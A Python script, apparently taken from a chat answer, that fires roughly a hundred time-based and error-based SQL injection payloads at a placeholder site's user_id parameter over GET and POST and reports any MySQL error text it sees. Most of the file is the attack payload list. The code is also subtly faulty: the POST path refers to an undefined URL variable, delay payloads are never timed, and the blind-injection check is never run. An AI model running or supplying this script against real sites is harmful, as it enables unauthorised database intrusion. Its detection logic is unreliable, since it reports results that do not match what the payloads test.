import requests

# Define the target URL with a vulnerable parameter
target_url = "http://example.com/vulnerable-page"

# Load common SQL injection payloads from a file
with open("common_payloads.txt", "r") as common_payload_file:
    common_payloads = common_payload_file.read().splitlines()

# Additional SQL injection payloads (including the ones you provided)
additional_payloads = [
    # ... (previously provided payloads)
    "from wapiti",
    "sleep(5)#",
    "1 or sleep(5)#",
    "\" or sleep(5)#",
    "' or sleep(5)#",
    "\" or sleep(5)=\"",
    "' or sleep(5)='",
    "1) or sleep(5)#",
    "\") or sleep(5)=\"",
    "\') or sleep(5)='",
    "1)) or sleep(5)#",
    "\")) or sleep(5)=\"",
    "\')) or sleep(5)='",
    ";waitfor delay '0:0:5'--",
    ");waitfor delay '0:0:5'--",
    "';waitfor delay '0:0:5'--",
    "\";waitfor delay '0:0:5'--",
    "');waitfor delay '0:0:5'--",
    "\");waitfor delay '0:0:5'--",
    "));waitfor delay '0:0:5'--",
    "\"));waitfor delay '0:0:5'--",
    "benchmark(10000000,MD5(1))#",
    "1 or benchmark(10000000,MD5(1))#",
    "\" or benchmark(10000000,MD5(1))#",
    "' or benchmark(10000000,MD5(1))#",
    "1) or benchmark(10000000,MD5(1))#",
    "\") or benchmark(10000000,MD5(1))#",
    "\') or benchmark(10000000,MD5(1))#",
    "1)) or benchmark(10000000,MD5(1))#",
    "\")) or benchmark(10000000,MD5(1))#",
    "\')) or benchmark(10000000,MD5(1))#",
    "pg_sleep(5)--",
    "1 or pg_sleep(5)--",
    "\" or pg_sleep(5)--",
    "' or pg_sleep(5)--",
    "1) or pg_sleep(5)--",
    "\") or pg_sleep(5)--",
    "\') or pg_sleep(5)--",
    "1)) or pg_sleep(5)--",
    "\")) or pg_sleep(5)--",
    "\')) or pg_sleep(5)--",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#",
    "SLEEP(5)#",
    "SLEEP(5)--",
    "SLEEP(5)=\"",
    "SLEEP(5)='",
    "or SLEEP(5)",
    "or SLEEP(5)#",
    "or SLEEP(5)--",
    "or SLEEP(5)=\"",
    "or SLEEP(5)='",
    "waitfor delay '00:00:05'",
    "waitfor delay '00:00:05'--",
    "waitfor delay '00:00:05'#",
    "benchmark(50000000,MD5(1))",
    "benchmark(50000000,MD5(1))--",
    "benchmark(50000000,MD5(1))#",
    "or benchmark(50000000,MD5(1))",
    "or benchmark(50000000,MD5(1))--",
    "or benchmark(50000000,MD5(1))#",
    "pg_SLEEP(5)",
    "pg_SLEEP(5)--",
    "pg_SLEEP(5)#",
    "or pg_SLEEP(5)",
    "or pg_SLEEP(5)--",
    "or pg_SLEEP(5)#",
    "'\\\"",
    "AnD SLEEP(5)",
    "AnD SLEEP(5)--",
    "AnD SLEEP(5)#",
    "&&SLEEP(5)",
    "&&SLEEP(5)--",
    "&&SLEEP(5)#",
    "' AnD SLEEP(5) ANd '1",
    "'&&SLEEP(5)&&'1",
    "ORDER BY SLEEP(5)",
    "ORDER BY SLEEP(5)--",
    "ORDER BY SLEEP(5)#",
    "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
    "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#",
    "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--",
    "+benchmark(3200,SHA1(1))+'",
    "+ SLEEP(10) + '",
    "RANDOMBLOB(500000000/2)",
    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "RANDOMBLOB(1000000000/2)",
    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
]

# Function to check if a response contains a known SQL injection error message
def is_sql_injection(response_text):
    common_error_messages = ["error in your SQL syntax", "mysql_fetch_array()", "supplied argument is not a valid MySQL"]
    for error in common_error_messages:
        if error in response_text:
            return True
    return False

# Function to test a payload for SQL injection
def test_payload(payload, method='GET'):
    if method == 'GET':
        full_url = target_url + f"?user_id={payload}"
        response = requests.get(full_url)
    elif method == 'POST':
        data = {'user_id': payload}
        response = requests.post(target_url, data=data)
    else:
        print(f"Invalid HTTP method: {method}")
        return

    if is_sql_injection(response.text):
        print(f"SQL Injection Detected: {full_url}")

# Function to test for blind SQL injection using a custom payload
def test_blind_sql_injection(custom_payload, method='GET'):
    if method == 'GET':
        full_url = target_url + f"?user_id={custom_payload}"
        response = requests.get(full_url)
    elif method == 'POST':
        data = {'user_id': custom_payload}
        response = requests.post(target_url, data=data)
    else:
        print(f"Invalid HTTP method: {method}")
        return

    if "Vulnerable" in response.text:
        print(f"Blind SQL Injection Detected: {full_url}")

# Custom payload for blind SQL injection testing
blind_sql_payload = "1' AND 1=CONVERT(int, (SELECT @@version)) --"

# Combine common payloads, additional payloads, and custom payloads
all_payloads = common_payloads + additional_payloads + [blind_sql_payload]

# Loop through all payloads and test for SQL injection
for payload in all_payloads:
    # Test with GET method
    test_payload(payload, method='GET')
    
    # Test with POST method
    test_payload(payload, method='POST')
